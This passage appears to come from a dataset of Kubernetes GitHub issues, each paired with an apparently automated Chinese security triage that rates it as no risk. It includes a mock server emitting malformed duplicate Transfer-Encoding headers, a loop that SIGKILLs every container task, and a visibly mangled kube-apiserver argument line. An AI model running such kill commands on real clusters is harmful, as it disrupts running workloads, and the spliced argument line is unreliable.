- Platform: Windows 11


#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述的问题是项目 README 文件中指向 `install.sh` 脚本的链接失效，导致用户点击时出现 404 错误。Issue 提交者建议将链接更新为正确的路径 `/scripts/install.sh`。

这个问题本质上是一个文档错误或链接失效的问题，属于可用性或文档维护方面的问题。它并未揭示软件本身存在的任何可以直接被利用来执行未授权操作、泄露敏感信息、导致拒绝服务或提升权限的缺陷。

根据风险判断标准：
1.  该问题不是软件本身的安全漏洞。
2.  Issue 提交者没有暴露敏感信息或进行不当操作。
3.  问题不涉及命令执行、容器逃逸、提权等高风险行为。
4.  问题不会导致拒绝服务（DoS）。
5.  问题不会泄露凭据。
6.  问题不涉及多用户场景下的权限绕过或互相影响。

因此，该 Issue 不涉及安全风险。

**复现过程：**

```python
# 该 Issue 不涉及安全风险，无需提供复现脚本。
# 问题是文档中的链接错误，可以通过手动检查 README 文件或尝试访问链接来复现。
print("该 Issue 指出的是文档链接错误，非安全风险，无需 PoC。")
```


**解释说明：**

该 Issue 报告的是文档（README 文件）中的一个超链接错误，指向安装脚本 `install.sh` 的链接已失效，导致用户点击后收到 404 Not Found 错误。这是一个典型的文档维护问题，影响了用户获取安装脚本的便捷性，但不代表软件本身存在可被利用的安全漏洞。由于它不满足任何低风险或高风险安全问题的定义，因此风险评级为“不涉及”，无需提供用于复现安全漏洞的 PoC 脚本。提供的 Python 代码仅输出一条说明信息。

---


## Issue #131099 Transfer-Encoding: chunked" while reading response header from upstream

- Issue 链接：[#131099](https://github.com/kubernetes/kubernetes/issues/131099)

### Issue 内容

#### What happened?

After upgrading  ngress-nginx-controller to v1.11.5 and kube webhook version v20231226-1a7112e06, getting-  upstream sent duplicate header line: "Transfer-Encoding: chunked", previous value: "Transfer-Encoding: chunked" while reading response header from upstream.

#### What did you expect to happen?

From our gui, i am trying to hit search api, but everytime i hit it i am getting upstream sent duplicate header line: "Transfer-Encoding: chunked", previous value: "Transfer-Encoding: chunked" while reading response header from upstream and 502 as response.

#### How can we reproduce it (as minimally and precisely as possible)?

I have upgraded from v1.9.4 to v.11.5 and kubehook from v20231011-8b53cabe0 to v20231226-1a7112e06, than i am getting this

#### Anything else we need to know?

I have tried to upgrade to v1.12.1 also, after that upgrade also getting same issue,

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.0
Kustomize Version: v5.4.2
Server Version: v1.30.3
```

</details>


#### Cloud provider

<details>
Azure
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个在升级 `ingress-nginx-controller` 和 `kube-webhook` 后出现的问题。具体表现为，当用户通过 GUI 访问某个 Search API 时，`ingress-nginx` 返回 502 Bad Gateway 错误，并在日志中记录 "upstream sent duplicate header line: 'Transfer-Encoding: chunked', previous value: 'Transfer-Encoding: chunked' while reading response header from upstream"。

这个错误信息明确指出问题来源于上游服务（upstream service），即 Search API 所在的后端应用。该应用在其 HTTP 响应中发送了两个重复的 `Transfer-Encoding: chunked` 头部。根据 HTTP/1.1 规范 (RFC 7230, Section 3.2.2)，大多数 Header 字段不允许多次出现，`Transfer-Encoding` 就是其中之一。`ingress-nginx` 作为反向代理，在接收到来自上游的不符合 HTTP 规范的响应时，会拒绝该响应并向上游客户端（即用户的 GUI 请求）返回 502 错误。

核心问题在于上游应用程序违反了 HTTP 协议标准，发送了重复的 `Transfer-Encoding` 头部。`ingress-nginx-controller` 只是忠实地检测并报告了这个来自上游的问题，其行为是符合预期的，因为它需要确保代理流量的规范性。

虽然这个问题导致了服务不可用（Search API 无法访问），这属于一种拒绝服务（Denial of Service）的情况，但其根源在于上游应用的错误配置或 Bug，而不是 `ingress-nginx-controller` 本身的漏洞。攻击者无法利用 `ingress-nginx-controller` 来直接造成危害，他们最多只能通过触发上游应用的这个 Bug 来间接导致该特定 API 的 502 错误。

根据风险判断标准：
1.  该问题不是 `ingress-nginx-controller` 组件本身的安全漏洞。
2.  问题是由上游服务（后端应用）引起的协议违规。
3.  虽然导致了服务不可用 (Availability Impact)，但这是上游应用的问题，`ingress-nginx` 只是报告者。
4.  不涉及命令执行、提权、信息泄露等高风险场景。

因此，该 Issue 描述的问题不属于 `ingress-nginx-controller` 项目的安全风险。

**复现过程：**

```python
# 该 Issue 指出的问题源于上游 (upstream) 服务发送了重复的 HTTP Header，
# 而非 ingress-nginx-controller 本身的漏洞。
# ingress-nginx-controller 只是检测并报告了上游服务的协议违规行为。
# 因此，该问题不被评定为 ingress-nginx-controller 的安全风险，
# 无需提供针对 ingress-nginx-controller 的复现 POC 脚本。
#
# 如果需要模拟上游服务的错误行为，可以创建一个简单的 HTTP 服务器，
# 在响应中故意发送重复的 "Transfer-Encoding: chunked" 头部。
# 以下是一个示例，用于演示上游服务如何可能触发此问题，但它并非针对 ingress-nginx 的漏洞利用。

import http.server
import socketserver
import threading
import time

PORT = 10080

class DuplicateHeaderHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            self.send_response(200)
            # 发送第一个 Transfer-Encoding header
            self.send_header("Transfer-Encoding", "chunked")
            # 故意发送第二个重复的 Transfer-Encoding header
            self.send_header("Transfer-Encoding", "chunked")
            self.send_header("Content-Type", "text/plain")
            self.end_headers()

            # 发送 chunked body (示例)
            chunk1 = b"This is the first chunk.\r\n"
            self.wfile.write(b"%x\r\n" % len(chunk1))
            self.wfile.write(chunk1)
            self.wfile.write(b"\r\n")

            chunk2 = b"This is the second chunk.\r\n"
            self.wfile.write(b"%x\r\n" % len(chunk2))
            self.wfile.write(chunk2)
            self.wfile.write(b"\r\n")

            # 发送结束 chunk
            self.wfile.write(b"0\r\n\r\n")
            print(f"Responded to GET {self.path} with duplicate Transfer-Encoding headers.")

        except Exception as e:
            print(f"Error handling request: {e}")

def run_server():
    with socketserver.TCPServer(("", PORT), DuplicateHeaderHandler) as httpd:
        print(f"Serving on port {PORT}. This server sends duplicate Transfer-Encoding headers.")
        print("Configure your Ingress to point to this service (ClusterIP or NodePort on localhost:10080).")
        print("Accessing the service via Ingress should trigger the 'duplicate header' error in ingress-nginx logs.")
        httpd.serve_forever()

# 主执行逻辑
print("Starting dummy HTTP server to simulate upstream error...")
server_thread = threading.Thread(target=run_server)
server_thread.daemon = True # 允许主线程退出时服务器线程也退出
server_thread.start()

# 让服务器运行一段时间 (例如 120 秒) 或直到手动中断
try:
    print("Server started in background thread. Running for 120 seconds.")
    print("You can now try accessing a Kubernetes Ingress resource pointing to this server.")
    time.sleep(120)
    print("Timeout reached. Stopping server simulation.")
except KeyboardInterrupt:
    print("Interrupted by user. Stopping server simulation.")

# 注意：实际停止 TCPServer 需要更复杂的处理，这里仅示意性地退出主线程。
# 在实际应用中，可以通过 httpd.shutdown() 在另一个线程中停止它。
```


**解释说明：**

上述 Python 脚本并未尝试复现 `ingress-nginx-controller` 的安全漏洞，因为它已被判断为“不涉及”安全风险。脚本的作用是创建一个简单的 HTTP 服务器，该服务器模拟了 Issue 中描述的上游（upstream）服务的错误行为——即在其响应中发送重复的 `Transfer-Encoding: chunked` HTTP 头部。

1.  **服务器设置**：脚本使用 Python 内置的 `http.server` 和 `socketserver` 模块在本地 `10080` 端口启动一个 TCP 服务器。
2.  **请求处理**：`DuplicateHeaderHandler` 类处理进入的 GET 请求。
3.  **模拟错误**：在 `do_GET` 方法中，服务器构建一个 HTTP 200 响应。关键在于它调用了 `self.send_header("Transfer-Encoding", "chunked")` 两次，故意制造了重复的头部。
4.  **Chunked 响应体**：为了使 `Transfer-Encoding: chunked` 合法（除了重复之外），脚本还发送了一个简单的分块编码的响应体。
5.  **运行与测试**：脚本在后台线程中运行服务器，并保持主线程活动 120 秒。要观察 Issue 中描述的现象，需要将 Kubernetes 集群中的一个 Ingress 资源配置为将流量转发到运行此脚本的 Pod 或节点上的 `10080` 端口。然后，通过该 Ingress 访问服务。此时，应该能在 `ingress-nginx-controller` 的日志中看到与 Issue 中描述类似的 "upstream sent duplicate header line" 错误，并且客户端会收到 502 响应。

这个脚本仅用于演示导致问题的上游服务行为，帮助理解 Issue 的根源，而不是利用 `ingress-nginx-controller` 的任何安全弱点。

---


## Issue #131087 error setting cgroup config for procHooks process: unable to freeze

- Issue 链接：[#131087](https://github.com/kubernetes/kubernetes/issues/131087)

### Issue 内容

#### What happened?

This is likely the wrong place, but I want to throw the hat in the ring and say that this is an issue beyond fixing the flakey test. Instead of duplicating the issue, I though it would be best to comment here instead.



We just saw the same error in a production cluster for a job which failed to run. It has run 20k+ times before.

```
level=error msg="StartContainer for \"xxxx\" failed" error="rpc error: code = Unknown desc = failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: error during container init: error setting cgroup config for procHooks process: unable to freeze"
```

```
  Warning  Failed     29m   kubelet            Error: failed to create containerd task: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container
 process: error during container init: error setting cgroup config for procHooks process: unable to freeze: unknown
```
Currently running on EKS:

- ami: ami-00ab73ce8dbebbdad
- machine: t3.xlarge
- k8s revision: v1.31.6-eks-bc803b4
- containerd version: 1.7.25
- OS: Amazon Linux 2, amd64
- Kernel version: 5.10.234-225.910.amzn2.x86_64

Node stats at the time:
- no resource requests on the pod (resources: {})
- usual consumption for job is ~3m cpu, 5Mi ram
- 9 other running pods on the node when job scheduled
- 1700m available vcpu, 3000Mi ram on the node
- no other known node alerts or cluster events
- no other pods affected on the node

Potentially related to https://github.com/kubernetes/kubernetes/issues/131043#issuecomment-2756029320

#### What did you expect to happen?

The container not to crash

#### How can we reproduce it (as minimally and precisely as possible)?

Have not been able to reproduce. Suspecting its related to the lack of pod requests, given that https://github.com/kubernetes/kubernetes/issues/131043#issuecomment-2756029320 fails due to minimal runtime footprint

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
- k8s revision: v1.31.6-eks-bc803b4

</details>


#### Cloud provider

<details>
AWS EKS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here
Linux ip-XXX.us-west-2.compute.internal 5.10.234-225.910.amzn2.x86_64 #1 SMP Fri Feb 14 16:52:40 UTC 2025 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
- containerd version: 1.7.25
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **问题描述分析**: 该 Issue 描述了一个在 Kubernetes (EKS) 环境中启动容器时遇到的错误。错误信息 `error setting cgroup config for procHooks process: unable to freeze` 指向了在容器初始化过程中，`runc` 尝试为 `procHooks` 配置 cgroup 时失败，具体是无法 "freeze" 进程。这通常发生在容器运行时（如 runc）与 Linux 内核的 cgroup 子系统交互时出现问题，可能是由于内核 bug、cgroup 配置冲突、资源竞争或特定时序下的 race condition。
2.  **上下文信息**:
    *   问题发生在生产环境的 EKS 集群上，使用的 Kubernetes、containerd、OS (Amazon Linux 2) 和内核版本都已提供。
    *   出错的 Pod 没有设置资源请求和限制 (`resources: {}`)。
    *   节点当时资源充足（1700m vCPU, 3000Mi RAM 可用）。
    *   该 Job 之前已成功运行 2 万多次，表明问题是间歇性的，难以稳定复现。
    *   用户怀疑问题与 Pod 未设置资源请求有关，并关联了另一个 Kubernetes Issue。
3.  **安全风险评估**:
    *   **问题性质**: 该错误导致 Pod 无法启动。这是一个**功能性问题**或**可靠性问题**，而不是典型的安全漏洞。它阻止了服务的正常运行，但并未直接导致数据泄露、权限提升、远程代码执行或容器逃逸。
    *   **拒绝服务 (DoS)**: 虽然 Pod 启动失败可以看作是一种局部 DoS（该 Pod 无法提供服务），但它似乎是运行时或内核层面的间歇性故障，而不是攻击者可以通过特定请求稳定触发的漏洞。根据 Issue 描述，用户自己也无法稳定复现。即使攻击者有权限创建 Pod，也难以利用此问题来可靠地瘫痪节点或其他服务。根据标准 #5，即使存在 DoS 可能，利用也需要创建 Pod 的权限，且效果不稳定、影响范围有限（单个 Pod 启动失败），不应判定为高风险。
    *   **信息泄露**: Issue 内容包含了一些环境信息（版本号、AMI ID、部分内网 IP），这是用户为了报告问题而主动提供的，并非由软件漏洞导致泄露。错误日志本身不包含敏感凭证信息。符合标准 #4。
    *   **命令执行/提权/容器逃逸**: 错误发生在容器启动的早期阶段（`runc create` -> `container init` -> `setting cgroup config for procHooks process`），在用户定义的容器进程实际运行之前。失败导致容器启动中止，没有迹象表明此失败路径可以被利用来执行非预期代码或突破容器隔离。不涉及标准 #7。
    *   **多租户影响**: 一个用户（或租户）的 Pod 启动失败，主要影响该用户自身的工作负载。虽然频繁失败可能消耗少量调度器和 Kubelet 资源，但没有迹象表明一个低权限用户可以利用此问题直接影响其他用户（或其他租户）的运行中容器或数据。不涉及标准 #8。
    *   **凭据泄露 (日志)**: Issue 中未提及日志泄露凭据的问题。不涉及标准 #6。
4.  **结论**: 该 Issue 描述的是一个容器运行时层面的间歇性故障，导致特定 Pod 启动失败。虽然影响了服务的可用性，但根据所提供的信息和风险判断标准，它不构成一个可利用的安全漏洞。其根本原因更可能在于内核、cgroup 实现或 runc/containerd 的 bug/race condition，尤其在未指定资源请求时可能更容易触发。

**复现过程：**

```python
# Issue 非安全风险，无需 POC 脚本
# 该问题描述了一个偶发的、难以复现的容器启动失败错误，与内核/cgroup/runc/containerd 的内部状态或竞争条件相关。
# 这类问题通常不被视为安全漏洞，而是功能性或稳定性问题。
# 无法编写一个确定性的 POC 来触发此安全风险，因为它本身不被判定为安全风险。
# 同时，根据 Issue 描述，用户也无法稳定复现该功能性问题。
pass
```


**解释说明：**

该 Issue 报告了一个在特定条件下（EKS 环境、特定内核/containerd 版本、无资源请求的 Pod）偶发的容器启动失败错误 `unable to freeze`。分析表明，这是一个与底层容器运行时（runc）、容器管理器（containerd）和 Linux 内核 cgroup 子系统交互相关的**功能性或稳定性问题**，而不是一个安全漏洞。它没有提供可利用的攻击向量来实现权限提升、信息泄露、命令执行或可靠的拒绝服务攻击。根据风险判断标准，此问题风险评级为“不涉及”。由于问题并非安全风险，且根据描述本身就难以复现，因此不提供复现脚本（POC）。提供的 Python 代码块为空，并注释说明了原因。

---


## Issue #131052 kube-apiserver cannot be gracefully terminated

- Issue 链接：[#131052](https://github.com/kubernetes/kubernetes/issues/131052)

### Issue 内容

#### What happened?

Currently, it seems that a few things may not work as expected when it comes to the `kube-apiserver` graceful termination, which can lead to a long shutdown period of the service:

```
Mar 25 09:53:35 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:35.510487 1210852 genericapiserver.go:690] [graceful-termination] waiting for shutdown to be initiated
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.838659 1210852 genericapiserver.go:548] "[graceful-termination] shutdown event" name="ShutdownInitiated"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.838688 1210852 genericapiserver.go:551] "[graceful-termination] shutdown event" name="AfterShutdownDelayDuration"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882707 1210852 genericapiserver.go:699] "[graceful-termination] pre-shutdown hooks completed" name="PreShutdownHooksStopped"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882730 1210852 genericapiserver.go:622] "[graceful-termination] shutdown event" name="NotAcceptingNewRequest"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882800 1210852 genericapiserver.go:656] "[graceful-termination] not going to wait for active watch request(s) to drain"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882845 1210852 genericapiserver.go:647] [graceful-termination] in-flight non long-running request(s) have drained
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.882872 1210852 genericapiserver.go:688] "[graceful-termination] shutdown event" name="InFlightRequestsDrained"
Mar 25 09:53:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:53:50.883779 1210852 genericapiserver.go:605] "[graceful-termination] shutdown event" name="HTTPServerStoppedListening"
Mar 25 09:58:50 ubuntu k8s.kube-apiserver[1210852]: I0325 09:58:50.884685 1210852 genericapiserver.go:722] [graceful-termination] apiserver is exiting
```

Note the 5 minute gap between the last 2 lines. That time is spent trying to shutdown the server (https://github.com/kubernetes/kubernetes/blob/ff25881bc1fe9da1dda4ec82d294b92078ae2763/staging/src/k8s.io/apiserver/pkg/server/secure_serving.go#L236-L238), and after 5 minutes it times out.

`kube-apiserver` is running with the following arguments:

```
/snap/k8s/x1/bin/kube-apiserver --advertise-addrescommon/args/conf.d/auth-token-webhook.conf --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/clientite.sock --feature-gates=WatchList=false --kubelet-certificate-authority=/etc/kubernetes/pki/ca.crt --kubelet-client-client.key --kubelet-preferred-address-types=InternalIP,Hostname,InternalDNS,ExternalDNS,ExternalIP --profiling=falseroxy-client.key --request-timeout=300s --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-filers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https:/file=/etc/kubernetes/pki/serviceaccount.key --service-cluster-ip-range=10.152.183.0/24 --tls-cert-file=/etc/kuberneteS_128_GCM_SHA256,TLS_AES_256_GCM_SHA384,TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,TLS_ECDHE_EA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,TLS_ECDHE__256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_RSA_WITH_3DES_ED_GCM_SHA384 --tls-min-version=VersionTLS12 --tls-private-key-file=/etc/kubernetes/pki/apiserver.key --v 5
```

Note the set ``--shutdown-delay-duration=0s`` and  ``--shutdown-watch-termination-grace-period=0s`` arguments, so there shouldn't be any "time to delay the termination", or "grace period the apiserver will wait for active watch request(s) to drain during the graceful server shutdown window" (https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/).

The ``http.server.Shutdown`` mentioned above will try to gracefully shut down the server, without interrupting any active connections (https://pkg.go.dev/net/http#Server.Shutdown). Basically, the operation times out because there are still active connections to the server. This can be replicated by starting the `kube-apiserver` and creating a watch request:

```
sudo systemctl start snap.k8s.kube-apiserver.service
sleep 5  # allow the apiserver to properly start.
kubectl get --watch nodes &
sudo systemctl stop snap.k8s.kube-apiserver.service  # This will now hang for 5 minutes (or maximum timeout set in the systemd unit).
```

The `kube-apiserver` service is immediately stopped, once the watch request is killed (assuming no other connection blocks the server from shutting down, see below).

Other kubernetes services may prevent `kube-apiserver` from shutting down as well. For example, if `kube-scheduler` is running, it will prevent `kube-apiserver` from stopping:

```
sudo netstat -apon | grep 6443 | sort
tcp        0      0 127.0.0.1:35344         127.0.0.1:6443          ESTABLISHED 1211870/kube-schedu  keepalive (23.36/0/0)
tcp        0      0 127.0.0.1:35356         127.0.0.1:6443          ESTABLISHED 1211870/kube-schedu  keepalive (23.36/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:35344         ESTABLISHED 1212449/kube-apiser  keepalive (33.42/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:35356         ESTABLISHED 1212449/kube-apiser  keepalive (33.44/0/0)
```

In this case, stopping `kube-scheduler` will allow `kube-apiserver` to gracefully shutdown. There are other Kubernetes components which may prevent `kube-apiserver` from shutting down:

```
sudo netstat -apon | grep 6443 | sort
tcp        0      0 127.0.0.1:44298         127.0.0.1:6443          ESTABLISHED 1212949/cilium-oper  keepalive (17.12/0/0)
tcp        0      0 127.0.0.1:48248         127.0.0.1:6443          ESTABLISHED 1212949/cilium-oper  keepalive (0.43/0/0)
tcp        0      0 127.0.0.1:48278         127.0.0.1:6443          ESTABLISHED 1213345/cilium-agen  keepalive (6.24/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:44298         ESTABLISHED 1212559/kube-apiser  keepalive (17.06/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:48248         ESTABLISHED 1212559/kube-apiser  keepalive (0.37/0/0)
tcp6       0      0 127.0.0.1:6443          127.0.0.1:48278         ESTABLISHED 1212559/kube-apiser  keepalive (6.22/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.157:43478        ESTABLISHED 1212559/kube-apiser  keepalive (18.34/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.17:59620         ESTABLISHED 1212559/kube-apiser  keepalive (19.02/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.47:43156         ESTABLISHED 1212559/kube-apiser  keepalive (20.38/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.75:49452         ESTABLISHED 1212559/kube-apiser  keepalive (20.06/0/0)
```

Above, we can see that `cilium-operator` and `cilium-agent` are connected to the Kubernetes API. Killing them however won't resolve the issue:

```
sudo kill -9 1212949 1213345
sudo netstat -apon | grep 6443 | sort
tcp6       0      0 172.26.39.150:6443      10.1.0.157:43478        ESTABLISHED 1212559/kube-apiser  keepalive (87.81/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.17:59620         ESTABLISHED 1212559/kube-apiser  keepalive (88.87/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.47:43156         ESTABLISHED 1212559/kube-apiser  keepalive (67.18/0/0)
tcp6       0      0 172.26.39.150:6443      10.1.0.75:49452         ESTABLISHED 1212559/kube-apiser  keepalive (89.77/0/0)
```

Now, what prevents the `kube-apiserver` from gracefully shutting down is its own connections to various Kubernetes Pods: 

```
kubectl  get pods -A -o wide
NAMESPACE     NAME                                  READY   STATUS    RESTARTS       AGE     IP              NODE     NOMINATED NODE   READINESS GATES
kube-system   cilium-frwvf                          1/1     Running   4 (3h5m ago)   3h21m   172.26.39.150   ubuntu   <none>           <none>
kube-system   cilium-operator-586c9984f4-sjc9t      1/1     Running   7 (3h6m ago)   3h21m   172.26.39.150   ubuntu   <none>           <none>
kube-system   ck-storage-rawfile-csi-controller-0   2/2     Running   2 (164m ago)   3h21m   10.1.0.47       ubuntu   <none>           <none>
kube-system   ck-storage-rawfile-csi-node-9fjpm     4/4     Running   8 (164m ago)   3h21m   10.1.0.75       ubuntu   <none>           <none>
kube-system   coredns-57df9874df-8mpdq              1/1     Running   1 (165m ago)   3h21m   10.1.0.17       ubuntu   <none>           <none>
kube-system   metrics-server-8694c96fb7-fcdmd       1/1     Running   1 (164m ago)   3h21m   10.1.0.157      ubuntu   <none>           <none>
```

After killing the containers, ``kube-apiserver`` is allowed to shutdown gracefully.

```
for taskid in `sudo ctr --namespace k8s.io task ls | awk '{print $1}' | tail -n+2`; do sudo ctr --namespace k8s.io task kill --signal SIGKILL $taskid; done
sudo netstat -apon | grep 6443 | sort  # outputs nothing, 
```


#### What did you expect to happen?

Watch requests should't prevent `kube-apiserver`'s graceful termination. `kube-apiserver` should terminate its connections to other Kubernetes-related components when shutting down (coredns, metrics-server, etc.).

#### How can we reproduce it (as minimally and precisely as possible)?

See examples above.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
kubectl version
Client Version: v1.30.11
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.32.2
```

</details>


#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
PRETTY_NAME="Ubuntu 24.04.1 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.1 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo

# paste output here
$ uname -a
# paste output here
Linux ubuntu 6.8.0-52-generic #53-Ubuntu SMP PREEMPT_DYNAMIC Sat Jan 11 00:06:25 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```
</details>


#### Install tools

<details>
k8s snap
</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue描述**: 该Issue描述了`kube-apiserver`在关闭时无法优雅终止（graceful termination）的问题。具体表现为，即使设置了`--shutdown-delay-duration=0s`和`--shutdown-watch-termination-grace-period=0s`，`kube-apiserver`在收到停止信号后，仍会等待长达5分钟才最终退出。
2.  **原因分析**: Issue提交者通过日志和实验分析，指出根本原因在于Go语言标准库`net/http`的`Server.Shutdown`方法会等待所有活动连接关闭。在Kubernetes场景下，这些活动连接包括：
    *   用户或客户端（如`kubectl watch`）发起的长连接（Watch请求）。
    *   其他Kubernetes核心组件（如`kube-scheduler`, CNI插件如`cilium-operator`, `cilium-agent`）与`kube-apiserver`建立的连接。
    *   `kube-apiserver`自身与其他组件（如CoreDNS, metrics-server等Pod）建立的连接。
    只要这些连接存在，`Server.Shutdown`就会等待，直到超时（默认或配置的超时时间，此处表现为5分钟）强制关闭。
3.  **安全风险评估**:
    *   **问题性质**: 该问题本质上是服务可用性问题，影响的是`kube-apiserver`的关闭速度，主要在维护、升级或重启场景下造成延迟。它不涉及未经授权的访问、数据泄露、权限提升、命令执行或容器逃逸等典型安全漏洞。
    *   **攻击向量**: 理论上，一个拥有`watch`权限的低权限用户可以通过建立一个持久的`watch`连接来故意延长`kube-apiserver`的关闭时间。然而，这仅仅是延长了关闭过程，并不会阻止管理员最终强制停止服务（例如通过`SIGKILL`或等待systemd超时）。
    *   **影响**: 主要影响是运维效率。在需要快速重启`kube-apiserver`的场景（如滚动更新、紧急修复部署）下，这个延迟可能会影响集群的整体恢复时间。但这并不直接导致安全风险。
    *   **权限要求**: 利用此问题（延长关闭时间）需要至少具有对某些资源的`watch`权限。根据风险判断标准第5条，拒绝服务（DoS）如果需要攻击者具备一定权限（即使是只读的watch权限），也需要视情况降级处理。此处的DoS影响仅限于关闭过程，且需要权限，不应判断为高风险。
    *   **与其他标准对比**: 对比标准中的高风险场景（命令执行、提权、多用户影响、日志凭据泄露等），此问题均不符合。
    *   **结论**: 该问题是一个功能缺陷或设计限制，导致在特定条件下（存在长连接）关闭延迟，影响运维效率，但不构成安全漏洞。

**复现过程：**

```python
# 本 Issue 被判定为“不涉及”安全风险，主要是一个影响运维效率的功能性问题。
# 根据要求，仅针对高风险问题提供复现POC。
# 因此，此处不提供复现脚本。

# 以下注释代码演示了如何使用 Python Kubernetes 客户端建立一个 watch 连接，
# 模拟 Issue 中提到的 `kubectl watch` 行为，理论上可以触发延迟关闭。
# 但请注意，这只是模拟客户端行为，并不能直接复现服务端代码层面的关闭逻辑问题。

"""
import time
import threading
import logging
from kubernetes import client, config, watch

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 假设 kubeconfig 文件位于默认位置 ~/.kube/config
try:
    config.load_kube_config()
    logging.info("kubeconfig loaded successfully.")
except Exception as e:
    logging.error(f"Failed to load kubeconfig: {e}")
    # 在无法加载配置时退出，因为无法连接集群
    exit(1)

# 创建 API 客户端实例
v1 = client.CoreV1Api()

# 设置一个标记来控制 watch 线程
stop_watch = threading.Event()

def watch_nodes():
    w = watch.Watch()
    try:
        # 尝试监听 nodes 事件，设置较长的超时时间模拟持久连接
        # stream() 会阻塞，直到超时或连接被服务器关闭或手动停止
        logging.info("Starting to watch node events...")
        # 使用 _request_timeout 设置 HTTP 请求本身的超时
        # 使用 timeout_seconds 控制 watch stream 的整体持续时间
        # 这里设置为 None 或一个很大的值来模拟持久 watch
        # 注意：实际的连接维持时间还受 apiserver 配置和网络因素影响
        for event in w.stream(v1.list_node, _request_timeout=None, timeout_seconds=None):
            # 简单打印事件类型和对象名称
            # logging.info(f"Event: {event['type']} Node: {event['object'].metadata.name}")

            # 检查是否需要停止 watch
            if stop_watch.is_set():
                logging.info("Stop signal received, stopping watch.")
                w.stop()
                break
    except client.ApiException as e:
        if stop_watch.is_set():
            logging.info("Watch stopped due to external signal.")
        elif "timed out" in str(e).lower():
            logging.warning("Watch connection timed out.")
        else:
            logging.error(f"API Error during watch: {e}")
    except Exception as e:
        if not stop_watch.is_set():
            logging.error(f"An unexpected error occurred during watch: {e}")
    finally:
        logging.info("Watch function finished.")
        w.stop() # 确保停止

def main():
    # 启动 watch 线程
